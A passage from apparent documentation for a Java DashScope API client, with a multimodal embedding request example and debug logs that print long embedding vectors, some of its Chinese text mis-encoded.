099274164225,-0.022020307123049965,-0.006824239370343544,0.026177668011426618,0.012437818701764218,0.020409900844860107,-0.002087246435029762,0.030723353817948343,0.02795939410644518,0.03437817657696078,0.007960660821973976,-0.017611677169991204,0.00591624434115139,-0.006498731718368999,0.004465736558668327,-0.018114215299355415,-0.007343909481390626,0.005527919423006318,0.011358503855743355,-0.004871193458496271,-0.025492388744111784,0.006687183516880578,0.02574365780879389,0.00007232016226024376,-0.006978427205489381,-0.026428937076108723,0.0129175141888846,-0.012243656242691681,0.05075635106578529,-0.03810152726270471,-0.033121831253550255,0.0054822341385186634,0.051715742040026054,0.017840103592429483,0.04139086774581591,-0.02597208423123217,-0.01667512883799427,0.04883756911730376],""text_index"":1}]},""usage"":{""total_tokens"":9},""request_id"":""f9ac3f63-7bc3-9057-b566-2b39636baa46""}
```

#### å¤šæ¨¡æ€å‘é‡è®¡ç®—

```java
// è¯·æ±‚
final var request = MmEmbeddingRequest.newBuilder()
    .model(MmEmbeddingModel.MM_EMBEDDING_ONE_PEACE_V1)
    .option(MmEmbeddingOptions.AUTO_TRUNCATION, true)
    .contents(List.of(
        Content.ofAudio(URI.create(""https://dashscope.oss-cn-beijing.aliyuncs.com/audios/2channel_16K.wav"")),
        Content.ofImage(URI.create(""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg"")),
        Content.ofText(""ä¸€ä¸ªå¸…å“¥åœ¨éª‘è‡ªè¡Œè½¦å¿µç»""),
        Content.ofText(""æœ‰ä¸¤ä¸ªè‡ªè¡Œè½¦"")
    ))
    .build();

// åº”ç­”
final var response = client.mmEmbedding(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-29 00:07:26 DEBUG dashscope://embeddingx/multimodal-embedding-one-peace-v1 => {""model"":""multimodal-embedding-one-peace-v1"",""input"":{""contents"":[{""factor"":1.0,""audio"":""https://dashscope.oss-cn-beijing.aliyuncs.com/audios/2channel_16K.wav""},{""image"":""https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-002.jpeg"",""factor"":1.0},{""factor"":1.0,""text"":""ä¸€ä¸ªå¸…å“¥åœ¨éª‘è‡ªè¡Œè½¦å¿µç»""},{""factor"":1.0,""text"":""æœ‰ä¸¤ä¸ªè‡ªè¡Œè½¦""}]},""parameters"":{""auto_truncation"":true}}
2024-03-29 00:07:27 DEBUG dashscope://embeddingx/multimodal-embedding-one-peace-v1 <= {""output"":{""embedding"":[-0.026409149169921875,-0.0069332122802734375,0.019269943237304688,0.019007444381713867,-0.004364192485809326,-0.01785755157470703,-0.0218735933303833,0.0065555572509765625,0.02151799201965332,0.008321762084960938,0.022843360900878906,0.028423309326171875,-0.0106658935546875,0.010956764221191406,-0.010951757431030273,-0.01063084602355957,-0.001979351043701172,-0.01910686492919922,0.020587921142578125,0.004684567451477051,-0.010324716567993164,-0.04344940185546875,0.01678466796875,-0.000095367431640625,-0.008687973022460938,0.012877106666564941,-0.02930450439453125,0.013735294342041016,-0.004124641418457031,0.012449264526367188,0.0027028322219848633,0.013525009155273438,0.006553173065185547,-0.008073210716247559,-0.01627349853515625,-0.01111602783203125,-0.024732589721679688,0.0013022422790527344,0.014744758605957031,0.010503768920898438,0.01639533042907715,-0.007075309753417969,-0.024723052978515625,0.028194427490234375,0.018787384033203125,-0.035709381103515625,0.006737232208251953,-0.0068683624267578125,-0.02841949462890625,0.01554727554321289,0.011457443237304688,0.0052013397216796875,-0.002953052520751953,-0.016448020935058594,-0.02358722686767578,0.00925135612487793,0.03975677490234375,0.019580841064453125,-0.023984909057617188,-0.036394357681274414,0.0417633056640625,-0.020185470581054688,0.0011172294616699219,-0.014080047607421875,-0.006896018981933594,-0.04808187484741211,0.0038938522338867188,0.0037975311279296875,-0.002498626708984375,0.031757354736328125,-0.009670734405517578,0.036128997802734375,0.01656484603881836,0.00674891471862793,-0.013772964477539062,0.0023107528686523438,-0.004352569580078125,0.001644134521484375,0.003993988037109375,0.01825714111328125,0.012478351593017578,0.00908660888671875,0.009018898010253906,0.0026879310607910156,-0.0007171630859375,0.04218292236328125,-0.00258636474609375,-0.0075841546058654785,-0.0029331445693969727,-0.007187962532043457,-0.003221273422241211,-0.004269123077392578,0.00273895263671875,-0.04039764404296875,0.016267776489257812,0.017835378646850586,0.0319366455078125,0.023279190063476562,-0.008258819580078125,-0.0006160736083984375,0.03899955749511719,0.020725250244140625,-0.013138771057128906,0.006677031517028809,0.006755828857421875,-0.020198345184326172,0.009278297424316406,-0.022789716720581055,-0.004502296447753906,-0.01996135711669922,0.029668807983398438,0.023926377296447754,-0.007825851440429688,0.027767181396484375,-0.011407852172851562,0.015226364135742188,-0.031424522399902344,0.0030465126037597656,-0.014542579650878906,-0.018341064453125,0.002925872802734375,0.00046539306640625,-0.024751663208007812,-0.008940696716308594,0.025907516479492188,-0.007537841796875,0.002613067626953125,0.020631790161132812,0.01054292917251587,0.03044891357421875,0.007734775543212891,-0.007664680480957031,-0.013179779052734375,0.01441049575805664,0.004833698272705078,0.002020597457885742,0.005855560302734375,-0.0018285512924194336,0.0139923095703125,-0.027044296264648438,0.003192901611328125,-0.034778594970703125,0.017791748046875,-0.0066224634647369385,0.008411407470703125,0.0017137527465820312,-0.00006186962127685547,-0.014886856079101562,0.0052144527435302734,-0.0014786720275878906,-0.018461227416992188,-0.04895782470703125,0.0076160430908203125,0.0153350830078125,0.03427886962890625,0.003513336181640625,0.01649951934814453,-0.02303600311279297,-0.009775161743164062,-0.0017809867858886719,0.003136873245239258,-0.0077114105224609375,-0.01644134521484375,0.013071060180664062,-0.010477542877197266,0.011406421661376953,0.002091646194458008,0.01175689697265625,0.012221574783325195,-0.012363433837890625,0.0029997825622558594,0.012116432189941406,-0.0047626495361328125,0.00016689300537109375,0.03551959991455078,0.007201671600341797,0.011114120483398438,-0.01018524169921875,0.0110321044921875,-0.024492263793945312,0.004486083984375,0.013619422912597656,0.008311271667480469,0.014752388000488281,0.046459197998046875,0.0063762664794921875,0.01354217529296875,0.03485870361328125,0.03646659851074219,0.01186370849609375,-0.033046722412109375,-0.01435089111328125,-0.022112131118774414,0.016246795654296875,-0.022922515869140625,-0.0011806488037109375,-0.018871307373046875,-0.01584911346435547,0.022504806518554688,0.0061893463134765625,0.012630462646484375,0.03980255126953125,-0.016916275024414062,0.0015468597412109375,0.008334159851074219,-0.043186187744140625,0.013196468353271484,0.0013675689697265625,-0.008810281753540039,0.0033817291259765625,-0.023420333862304688,0.018762588500976562,0.018636703491210938,-0.009860992431640625,0.0012335777282714844,-0.007477760314941406,0.010670185089111328,0.000202178955078125,-0.019802093505859375,-0.023097991943359375,0.021350860595703125,-0.007383361458778381,-0.0074863433837890625,-0.00801849365234375,0.00096893310546875,-0.00327301025390625,-0.05045318603515625,-0.0030531883239746094,-0.006514072418212891,0.002519577741622925,0.004921913146972656,0.019110679626464844,-0.0170745849609375,-0.007849693298339844,-0.015408039093017578,-0.004937529563903809,-0.01512908935546875,0.04047584533691406,0.013519763946533203,0.004108428955078125,0.03105020523071289,0.054172515869140625,-0.005817413330078125,0.01626420021057129,0.01290130615234375,-0.0224761962890625,-0.029872894287109375,-0.008163928985595703,0.013612747192382812,0.007869720458984375,-0.01591813564300537,-0.010005950927734375,0.015138626098632812,-0.002076759934425354,0.020946502685546875,0.0005998611450195312,0.030853271484375,0.01306915283203125,0.021817684173583984,-0.0002288818359375,-0.004387855529785156,0.010220170021057129,-0.014397621154785156,-0.0003261566162109375,0.017181396484375,-0.005928099155426025,-0.015947341918945312,0.0002765655517578125,0.009938716888427734,0.024812698364257812,0.00128173828125,0.0067043304443359375,-0.0019674301147460938,-0.015000343322753906,0.0017549693584442139,-0.003283977508544922,-0.006786346435546875,-0.019143104553222656,0.017856597900390625,0.017751693725585938,-0.041980743408203125,0.008070707321166992,-0.004060149192810059,0.012944698333740234,0.0018754005432128906,0.00983428955078125,0.015464305877685547,-0.02191162109375,-0.04315185546875,-0.011224746704101562,0.0060193538665771484,-0.014934182167053223,0.0077135562896728516,-0.01781177520751953,-0.012964248657226562,-0.023914337158203125,-0.018342971801757812,-0.00267791748046875,0.0005092620849609375,-0.011952459812164307,-0.006848335266113281,-0.02891826629638672,-0.01262962818145752,-0.0012683868408203125,-0.041629791259765625,-0.007033109664916992,0.014697849750518799,0.02813267707824707,-0.019969940185546875,0.013624191284179688,0.020941734313964844,0.028916358947753906,0.01287984848022461,-0.0028486251831054688,-0.00493621826171875,0.007391929626464844,-0.005214214324951172,0.02706623077392578,-0.014042258262634277,0.0023651123046875,0.016432762145996094,0.008610725402832031,0.0056411027908325195,0.022918701171875,-0.0117034912109375,0.018279075622558594,0.017839431762695312,-0.0022039413452148438,0.012465476989746094,-0.022377967834472656,-0.007831573486328125,0.028259873390197754,0.014179229736328125,0.010362625122070312,-0.007918357849121094,-0.002402007579803467,-0.0004825592041015625,0.0062465667724609375,-0.0008120536804199219,0.039936065673828125,-0.013107895851135254,0.0010170936584472656,-0.003047943115234375,0.010544061660766602,-0.0030755996704101562,-0.025849103927612305,-0.010732650756835938,-0.01465606689453125,-0.004939556121826172,-0.01777935028076172,0.0039215087890625,-0.028255462646484375,-0.01673126220703125,0.023319244384765625,0.027498245239257812,0.04931640625,-0.007958054542541504,0.007862091064453125,0.007472991943359375,-0.02761077880859375,-0.010347127914428711,0.0097808837890625,0.00905609130859375,0.002376556396484375,-0.013995170593261719,-0.037250518798828125,0.021175384521484375,-0.024188995361328125,0.007935047149658203,0.00042724609375,0.015501976013183594,-0.0034143924713134766,0.02068328857421875,-0.0322418212890625,-0.019559860229492188,0.004485011100769043,-0.016287803649902344,0.005614757537841797,0.008584976196289062,-0.0239105224609375,-0.018040582537651062,-0.03662109375,0.0032792091369628906,-0.009837508201599121,-0.007625102996826172,0.03132438659667969,-0.0045490264892578125,0.010850191116333008,-0.021097183227539062,0.008755207061767578,-0.0021371841430664062,0.015928268432617188,0.012967467308044434,-0.021305084228515625,0.017067909240722656,0.012088298797607422,-0.017396926879882812,0.01512908935546875,-0.021584510803222656,0.013494908809661865,-0.011016130447387695,-0.005206197500228882,-0.018878936767578125,0.02294445037841797,0.027493000030517578,-0.006791114807128906,-0.00170135498046875,0.017303466796875,-0.0361328125,0.0024857521057128906,-0.002435445785522461,0.023715972900390625,0.030936062335968018,-0.009298086166381836,-0.002009153366088867,-0.0052165985107421875,0.01374053955078125,-0.014021873474121094,0.01277470588684082,-0.020832061767578125,-0.006807804107666016,-0.027975082397460938,0.010005950927734375,-0.03504180908203125,0.006230831146240234,-0.020915985107421875,0.0071489810943603516,-0.007068634033203125,0.006247520446777344,0.01184844970703125,0.011506080627441406,-0.009983062744140625,-0.003406524658203125,-0.019430160522460938,0.011304855346679688,-0.0033006668090820312,-0.024302959442138672,0.017772197723388672,-0.03141975402832031,0.007048130035400391,0.020715713500976562,-0.012560844421386719,-0.0161285400390625,-0.018296241760253906,0.020160675048828125,0.02417922019958496,0.004185676574707031,0.0142974853515625,0.01526641845703125,-0.005260467529296875,-0.038455963134765625,0.0235135555267334,-0.012950897216796875,-0.019367218017578125,-0.021886825561523438,0.00313568115234375,0.0030488967895507812,0.024570465087890625,-0.0036351680755615234,0.0065555572509765625,0.0324859619140625,-0.0024251937866210938,-0.0029175281524658203,0.03600311279296875,-0.02771472930908203,0.044263362884521484,-0.016674041748046875,0.0027513504028320312,-0.005761146545410156,0.00794219970703125,0.0058193206787109375,-0.023189544677734375,-0.005997896194458008,-0.026912212371826172,-0.00792694091796875,0.007104396820068359,-0.022975921630859375,0.022966384887695312,-0.011808395385742188,0.017406463623046875,0.01082611083984375,0.013742208480834961,0.004108428955078125,-0.010831832885742188,0.02187347412109375,-0.004651069641113281,-0.02426910400390625,-0.020263671875,0.0034837722778320312,-0.017427444458007812,-0.01552891731262207,-0.007451057434082031,0.009335517883300781,0.0010988712310791016,0.0023107528686523438,0.013110160827636719,0.04714202880859375,0.019105911254882812,0.029010772705078125,0.015825271606445312,0.0073299407958984375,0.0115203857421875,-0.016527175903320312,-0.02292865514755249,0.00042939186096191406,0.0296630859375,-0.000942230224609375,-0.0010347366333007812,0.019899368286132812,-0.017772793769836426,-0.022586822509765625,-0.00677490234375,0.004417896270751953,-0.019364356994628906,-0.022399425506591797,0.006656646728515625,0.01659679412841797,-0.023227691650390625,0.021284103393554688,-0.0007677078247070312,-0.020326614379882812,-0.014209747314453125,-0.01275634765625,-0.023122131824493408,0.0008492469787597656,-0.01960134506225586,-0.02972412109375,-0.006860196590423584,-0.0008940696716308594,0.04840087890625,-0.017180442810058594,0.0019321441650390625,-0.01644134521484375,-0.0048961639404296875,-0.005269050598144531,-0.013040542602539062,0.008395195007324219,0.006029725074768066,0.023755669593811035,-0.008032798767089844,0.010899364948272705,0.013362884521484375,-0.026454925537109375,0.003951936960220337,-0.021045684814453125,-0.015771865844726562,0.0231475830078125,-0.029165267944335938,-0.0022974014282226562,-0.007033586502075195,0.008241653442382812,-0.012084007263183594,-0.0107269287109375,-0.009366989135742188,-0.002719879150390625,-0.005873680114746094,-0.004998207092285156,-0.0003662109375,-0.026948928833007812,0.031993865966796875,-0.025508880615234375,0.0519561767578125,0.0000667572021484375,-0.007905960083007812,-0.03220367431640625,-0.00836801528930664,-0.007869482040405273,0.017225265502929688,-0.035968780517578125,0.024688720703125,-0.0010194778442382812,0.007033348083496094,-0.00936126708984375,-0.00032806396484375,-0.018140792846679688,-0.0030670166015625,-0.00013065338134765625,-0.012921333312988281,0.002864360809326172,0.02057969570159912,0.0087127685546875,0.010410308837890625,-0.0003848075866699219,0.005535125732421875,-0.03342151641845703,-0.00284576416015625,0.017289161682128906,0.02434539794921875,-0.0035431385040283203,0.020455002784729004,0.016574859619140625,-0.019145965576171875,0.014417171478271484,0.010037422180175781,-0.01385509967803955,-0.020748138427734375,0.027624130249023438,-0.018476009368896484,0.00870513916015625,0.00740814208984375,0.004199028015136719,-0.009980201721191406,-0.041900634765625,-0.038153648376464844,0.004982948303222656,-0.00757598876953125,0.0028977394104003906,0.0015020370483398438,-0.008044242858886719,-0.012212514877319336,-0.009002685546875,-0.009159088134765625,-0.01213836669921875,-0.019840240478515625,0.0112486332654953,-0.0346527099609375,0.02825164794921875,0.004944801330566406,0.017763137817382812,0.0036334991455078125,-0.00782012939453125,-0.02101278305053711,0.007053375244140625,0.004183769226074219,-0.00261688232421875,0.0010809898376464844,0.018781661987304688,0.020746469497680664,0.0051610469818115234,-0.023183822631835938,-0.022640228271484375,0.0073986053466796875,0.009684920310974121,0.004950523376464844,-0.013257980346679688,0.03165626525878906,0.0081329345703125,0.013475418090820312,0.0055694580078125,0.03699684143066406,0.025867462158203125,-0.009598731994628906,-0.010219573974609375,-0.006028175354003906,0.03516507148742676,0.029249191284179688,0.022864937782287598,-0.0036182403564453125,-0.027063369750976562,-0.00665283203125,-0.008031845092773438,-0.014078140258789062,-0.011250078678131104,-0.013495206832885742,0.004352569580078125,-0.012280464172363281,-0.0186004638671875,0.012902259826660156,0.005423903465270996,-0.008781671524047852,-0.020849227905273438,-0.009944915771484375,0.0225677490234375,0.01090240478515625,0.014336436986923218,0.02898406982421875,0.024335384368896484,-0.043773651123046875,0.008069515228271484,-0.004877567291259766,0.008295059204101562,-0.015966415405273438,0.00356292724609375,-0.011985212564468384,-0.021459579467773438,0.007671356201171875,0.006745338439941406,-0.016894817352294922,-0.0011348724365234375,-0.00370025634765625,-0.012965202331542969,0.006458282470703125,0.0167083740234375,-0.00191497802734375,-0.004090487957000732,0.01709747314453125,0.004047870635986328,-0.0015459060668945312,-0.017927169799804688,-0.011654853820800781,0.020573139190673828,0.03529930114746094,0.013696670532226562,-0.005130290985107422,-0.004982471466064453,-0.013752460479736328,-0.023265838623046875,0.0045948028564453125,0.019138336181640625,0.008185625076293945,0.016518354415893555,0.023659706115722656,-0.0009086132049560547,-0.007733345031738281,-0.000621795654296875,0.001605987548828125,-0.010295867919921875,-0.010781288146972656,0.024916648864746094,0.0038330554962158203,-0.0011196136474609375,-0.0009768009185791016,-0.004784584045410156,-0.009212493896484375,-0.016958236694335938,0.027416229248046875,-0.01259756088256836,0.007937908172607422,0.008712291717529297,0.012671470642089844,0.005016326904296875,-0.0017042160034179688,-0.019853591918945312,-0.021303653717041016,0.00078582763671875,0.0345916748046875,0.005578517913818359,-0.01602959632873535,0.02281951904296875,0.008701801300048828,-0.0194549560546875,-0.018331527709960938,-0.00145721435546875,0.017847061157226562,-0.0016632080078125,0.0019140243530273438,-0.010118484497070312,-0.00003361701965332031,-0.019842326641082764,0.006102234125137329,-0.02023601531982422,-0.014788627624511719,0.01056051254272461,-0.0007123947143554688,-0.030268430709838867,-0.010068893432617188,0.01397716999053955,0.0090789794921875,-0.015488147735595703,-0.03184318542480469,0.000957489013671875,-0.016417503356933594,-0.0012082159519195557,0.031581878662109375,-0.003924369812011719,-0.03434181213378906,-0.00199127197265625,0.026735305786132812,0.010692596435546875,0.014389991760253906,0.024695873260498047,-0.010166168212890625,-0.025803565979003906,0.019855499267578125,0.007356166839599609,0.00200653076171875,0.004543304443359375,-0.02131366729736328,0.009784698486328125,-0.0007410049438476562,0.0015878677368164062,0.012359619140625,-0.009090423583984375,0.027805328369140625,-0.029253005981445312,-0.013429641723632812,-0.0191497802734375,0.0207366943359375,0.015712738037109375,0.01129770278930664,0.0070590972900390625,0.052001953125,0.018505096435546875,0.012189865112304688,-0.022455215454101562,-0.006117820739746094,0.00644683837890625,-0.010872960090637207,0.024570465087890625,-0.044330596923828125,-0.024204254150390625,-0.0200042724609375,-0.014544963836669922,0.02239990234375,-0.023189544677734375,-0.008693695068359375,-0.004992961883544922,0.010601043701171875,0.01981377601623535,0.011806964874267578,-0.01589524745941162,0.010772466659545898,0.026300430297851562,0.006534576416015625,-0.019054412841796875,-0.043548583984375,0.015831947326660156,0.00054931640625,0.006204128265380859,-0.0093536376953125,-0.016933441162109375,0.0055446624755859375,-0.017252445220947266,0.0005619525909423828,-0.002444028854370117,-0.01882171630859375,-0.025396347045898438,0.0092010498046875,-0.04595184326171875,0.01120138168334961,-0.0021228790283203125,-0.017965316772460938,-0.009843826293945312,-0.03500652313232422,0.01142120361328125,-0.012362480163574219,-0.010705947875976562,-0.010977983474731445,0.01877307891845703,-0.013124465942382812,0.0017638206481933594,-0.011728405952453613,-0.00019741058349609375,0.013208389282226562,-0.01964569091796875,0.047976016998291016,-0.0044078826904296875,0.00855875015258789,0.009824752807617188,0.0009918212890625,0.011437416076660156,0.013042449951171875,0.0078029632568359375,-0.02964019775390625,-0.010420262813568115,0.0032444000244140625,0.027982711791992188,-0.006988584995269775,0.01195991039276123,-0.03798389434814453,0.022722244262695312,0.0058612823486328125,0.014232635498046875,0.012263298034667969,-0.02658843994140625,0.0013155937194824219,0.0056247711181640625,-0.0434722900390625,0.017958879470825195,0.020740270614624023,-0.022977828979492188,0.021724700927734375,-0.024759292602539062,0.025125503540039062,0.009482383728027344,-0.010997772216796875,0.022123336791992188,0.0013804435729980469,0.0036077499389648438,-0.00286102294921875,-0.0255889892578125,-0.008465290069580078,-0.001964569091796875,0.015351295471191406,0.004029273986816406,-0.002907097339630127,0.012477397918701172,0.014642715454101562,-0.013310432434082031,-0.0283050537109375,0.0030984878540039062,0.007604122161865234,-0.02023792266845703,-0.0023005008697509766,-0.02260589599609375,-0.012882232666015625,-0.020160675048828125,0.024152755737304688,0.024440765380859375,-0.017038345336914062,-0.00025272369384765625,0.03184032440185547,0.012683868408203125,-0.0032466650009155273,-0.015590667724609375,0.007255434989929199,-0.022096633911132812,-0.043609619140625,0.004124164581298828,-0.015163064002990723,0.019342899322509766,0.032405853271484375,0.002512693405151367,0.012612342834472656,0.008920669555664062,-0.011710166931152344,0.004619479179382324,0.00339508056640625,-0.013296842575073242,0.01153564453125,-0.004476815462112427,0.007638275623321533,0.028653621673583984,0.0026903152465820312,0.02442169189453125,0.0036079883575439453,-0.004741668701171875,0.0007185935974121094,-0.02651071548461914,-0.023145675659179688,0.0074405670166015625,-0.010251998901367188,-0.00798797607421875,-0.007457733154296875,0.0030107498168945312,-0.00382232666015625,-0.011152267456054688,-0.0142059326171875,-0.005826473236083984,0.026821136474609375,-0.030930519104003906,-0.01899433135986328,-0.02466869354248047,-0.01697540283203125,-0.0020122528076171875,0.016819000244140625,-0.012147784233093262,-0.00452423095703125,-0.013282418251037598,0.011698484420776367,-0.011749267578125,0.005962371826171875,0.020397186279296875,0.0018553733825683594,0.026247024536132812,-0.021659374237060547,-0.0043926239013671875,-0.022314071655273438,0.0032558441162109375,-0.01929950714111328,0.0070819854736328125,-0.031322479248046875,-0.0072460174560546875,0.02514171600341797,0.023197293281555176,0.017496347427368164,0.016412734985351562,0.015550613403320312,0.029481887817382812,0.0024938583374023438,-0.03358268737792969,0.009153604507446289,-0.0059206485748291016,-0.018990516662597656,-0.011719703674316406,0.02089691162109375,-0.02517986297607422,-0.03409004211425781,0.007758140563964844,-0.019727468490600586,0.0066165924072265625,0.024572372436523438,-0.015870749950408936,0.020519495010375977,0.008495330810546875,-0.01471710205078125,-0.004069328308105469,-0.012205123901367188,-0.01880168914794922,0.0022734403610229492,-0.009032249450683594,-0.01767730712890625,-0.011598587036132812,0.015825271606445312,0.009517669677734375,-0.0142059326171875,0.0017118453979492188,-0.012073516845703125,0.017994403839111328,0.014819145202636719,0.017164230346679688,-0.01837635040283203,-0.021579742431640625,-0.004968404769897461,0.013225555419921875,-0.02767181396484375,0.0015041828155517578,0.0200347900390625,-0.014980196952819824,-0.007397174835205078,0.009478569030761719,0.008846282958984375,-0.0443115234375,-0.021879196166992188,-0.006868839263916016,0.01274871826171875,-0.011800765991210938,-0.021856307983398438,0.001911163330078125,0.01044464111328125,-0.0046634674072265625,-0.002880096435546875,0.006512641906738281,-0.011351346969604492,-0.01728057861328125,-0.014253616333007812,-0.013347625732421875,-0.002254486083984375,0.02197885513305664,-0.03180694580078125,0.01308584213256836,-0.0286712646484375,0.014621734619140625,0.004803180694580078,-0.0016193389892578125,-0.030719757080078125,-0.0024809837341308594,0.01842975616455078,0.003505706787109375,0.008195877075195312,-0.0056934356689453125,-0.01154327392578125,0.017331600189208984,-0.009812355041503906,-0.008294105529785156,0.002582550048828125,0.041065216064453125,0.02294921875,0.011183738708496094,-0.01893782615661621,0.010000228881835938,0.006923675537109375,-0.02275848388671875,-0.009257316589355469,0.029851913452148438,-0.00969696044921875,-0.025770187377929688,0.0031042098999023438,0.013427734375,0.005124151706695557,0.00091552734375,-0.008762836456298828,-0.0047969818115234375,-0.01312565803527832,0.0071773529052734375,-0.007502555847167969,0.0018901824951171875,0.0009469985961914062,-0.009815216064453125,-0.01870870590209961,0.02675914764404297,0.01828479766845703,-0.0006215572357177734,-0.025432586669921875,-0.00489044189453125,0.013131141662597656,0.00298309326171875,-0.004065036773681641,0.018266499042510986,-0.02120208740234375,-0.007919788360595703,0.0031414031982421875,-0.028224945068359375,0.016166329383850098,0.03076648712158203,-0.0521693229675293,0.012002825736999512,0.0062749385833740234,-0.022798538208007812,-0.00193023681640625,0.026035308837890625,-0.016458511352539062,0.030635356903076172,0.009813308715820312,0.012674808502197266,-0.01869058609008789,-0.018732547760009766,-0.019260406494140625,-0.021635055541992188,-0.01958942413330078,0.005859375,-0.01403498649597168,-0.010931015014648438,0.005549430847167969,-0.004682660102844238,-0.01435995101928711,0.018383026123046875,-0.019127845764160156,0.03119659423828125,-0.004809856414794922,0.008137226104736328,0.023308873176574707,0.030050992965698242,-0.01059722900390625,0.0044727325439453125,-0.0158233642578125,-0.007042407989501953,-0.00787973403930664,0.001673579216003418,-0.015542984008789062,0.013258934020996094,0.00954437255859375,0.0653533935546875,0.010868072509765625,0.02274608612060547,0.015302658081054688,-0.01785755157470703,-0.008780479431152344,-0.0075531005859375,-0.014470100402832031,0.003185272216796875,0.014212608337402344,-0.01470184326171875,0.007844924926757812,0.0058155059814453125,-0.019008636474609375,-0.007155418395996094,0.011980444192886353,0.03687477111816406,0.00979304313659668,-0.0086517333984375,0.01589369773864746,-0.02635955810546875,0.01401519775390625,0.004192352294921875,0.031229019165039062,0.034450531005859375,-0.03583335876464844,-0.014777660369873047,-0.0046224892139434814,-0.01515960693359375,-0.0070400238037109375,0.042140960693359375,-0.014858245849609375,0.0026659369468688965,0.017610549926757812,-0.02205657958984375,-0.02759552001953125,-0.03662109375,-0.017461776733398438,-0.039302825927734375,-0.00030803680419921875,-0.002872288227081299,0.001255035400390625,0.023782730102539062,0.01866912841796875,0.00894927978515625,-0.02667236328125,0.0055694580078125,0.00995635986328125,-0.002247333526611328,0.003208160400390625,-0.031032562255859375,0.00023794174194335938,0.021986931562423706,-0.0189666748046875,0.010197639465332031,0.0068035125732421875,-0.007573127746582031,-0.013179779052734375,0.0068416595458984375,-0.007094383239746094,-0.007396697998046875,0.02311992645263672,-0.023059844970703125,0.03047943115234375,0.0030231475830078125,0.0030231475830078125,-0.000011444091796875,-0.024669647216796875,-0.00347137451171875,-0.012431144714355469,0.037899017333984375,0.006854057312011719,0.04059600830078125,-0.01750946044921875,-0.020485877990722656,0.007534027099609375,-0.0014934539794921875,-0.017330169677734375,0.010784149169921875,0.0046863555908203125,-0.00042057037353515625,0.012380599975585938,-0.013477325439453125,0.012972831726074219,-0.005650520324707031,0.006976127624511719,0.008848190307617188,-0.03168678283691406,0.0060863494873046875,-0.012675106525421143,-0.00452423095703125,0.010771751403808594,0.019414424896240234,0.00414276123046875,-0.024505615234375,-0.02331829071044922,-0.006413936614990234,-0.02246570587158203,-0.011936187744140625,-0.008569717407226562,-0.04334449768066406,-0.003168821334838867,-0.05678820610046387,-0.02024078369140625,-0.017319202423095703,0.031622886657714844,-0.0551910400390625,-0.0064067840576171875,-0.008914470672607422,0.013456344604492188,0.028057098388671875,-0.002521514892578125,0.021375656127929688,0.0002593994140625,-0.011912822723388672,0.018951416015625,-0.015659332275390625,-0.005734443664550781,-0.01125335693359375,-0.0048770904541015625,0.00754779577255249,-0.010206222534179688,-0.0027179718017578125,-0.0022835731506347656,0.0066280364990234375,0.0049991607666015625,0.0073337554931640625,-0.0026023387908935547,0.0042896270751953125,-0.008472442626953125,-0.006000518798828125,0.005978986620903015,0.04144096374511719,0.025770187377929688,-0.017887115478515625,-0.019112110137939453,-0.01268148422241211,0.005904197692871094,-0.014520764350891113,0.0240478515625,0.0022497177124023438,0.002758026123046875,-0.0002384185791015625,-0.01725947856903076,-0.0068149566650390625,0.00356292724609375,0.01715397834777832,-0.0022983551025390625,0.024110794067382812,0.0071059465408325195,-0.007490992546081543,0.0064487457275390625,-0.026391029357910156,-0.008091926574707031,0.0054264068603515625,0.008389472961425781,-0.002796173095703125,-0.011179924011230469,-0.0301666259765625,0.01064610481262207,0.022630691528320312,0.002849578857421875,-0.017267227172851562,0.0022830963134765625,-0.016002655029296875,0.009270191192626953,-0.0023946762084960938,-0.016635894775390625,0.014682769775390625,0.030345916748046875,0.025140762329101562,-0.013407230377197266,0.016996145248413086,0.0059642791748046875,0.006434917449951172,0.01766347885131836,-0.03404998779296875,0.013857841491699219,-0.007364749908447266,0.027521371841430664,0.0185086727142334,0.009374618530273438,0.0041637420654296875,-0.001495361328125,0.032068848609924316,0.012919425964355469,-0.0156632661819458,0.0047855377197265625,-0.007779598236083984,0.04093170166015625,-0.02104663848876953,-0.024135589599609375,-0.0039272308349609375,-0.0031518936157226562,-0.028255462646484375,-0.020275592803955078,0.013723134994506836,0.0000514984130859375,0.011342048645019531,-0.009977340698242188,-0.006821915507316589,-0.0029325485229492188,0.025970458984375,0.018266677856445312,0.007988929748535156,0.0057525634765625,0.024163246154785156,0.003002166748046875,-0.03264617919921875,0.008662700653076172,-0.00856637954711914,-0.00021696090698242188,0.009143829345703125,-0.013262271881103516,0.03429412841796875,0.012668609619140625,-0.021894454956054688,0.00560152530670166,-0.02027130126953125,-0.011510848999023438,-0.006572723388671875,-0.003208160400390625,0.0321803092956543,0.0069119930267333984,0.028016090393066406,-0.021007537841796875,0.013442039489746094,0.0347137451171875,0.009145975112915039,0.013235092163085938,-0.0004239082336425781,0.019448280334472656,-0.005435943603515625,-0.013116836547851562,-0.002476811408996582,0.009334564208984375,0.005548834800720215,-0.03663831949234009,0.005269050598144531,-0.017805099487304688,0.0062427520751953125,-0.020352840423583984,0.01363372802734375,0.012795448303222656,-0.01770305633544922,0.010586202144622803,-0.004390239715576172,0.006525993347167969,0.008387565612792969,0.013690412044525146,0.015453338623046875,0.016832351684570312,0.0016205310821533203,-0.008472442626953125,-0.013593673706054688,-0.0007975101470947266,0.00005844235420227051,-0.01666402816772461,0.032901763916015625,-0.001873016357421875,0.01458740234375,-0.013909339904785156,-0.0012216567993164062,0.006198406219482422,-0.011687278747558594,0.008055806159973145,-0.004341334104537964,-0.01659393310546875,0.0040130615234375,0.011870980262756348,0.015612363815307617,-0.004800811409950256,0.01993560791015625,0.0026276111602783203,-0.03765273094177246,-0.014386177062988281,0.005565643310546875,0.01947641372680664,0.027099609375,-0.008671998977661133,-0.0063707828521728516,0.017267227172851562,0.0048940181732177734,0.006175994873046875,-0.019133567810058594,-0.01977825164794922,-0.01381683349609375,-0.01605987548828125,-0.024147987365722656,0.010377883911132812,-0.0238189697265625,-0.0001201629638671875,-0.00151824951171875,-0.035950422286987305,0.0316925048828125,-0.002849578857421875,-0.0216064453125,0.020771026611328125,-0.04282665252685547,-0.0012485980987548828,-0.004303932189941406,-0.0009965896606445312,0.03778266906738281,0.009292125701904297,0.012995719909667969,-0.019092559814453125,-0.0056781768798828125,-0.014499664306640625,0.024135589599609375,0.010506153106689453,-0.018766403198242188,0.0014905929565429688,-0.0062427520751953125,-0.011827349662780762,0.010950088500976562,0.010059237480163574,0.0020339488983154297,0.03912353515625,0.00962400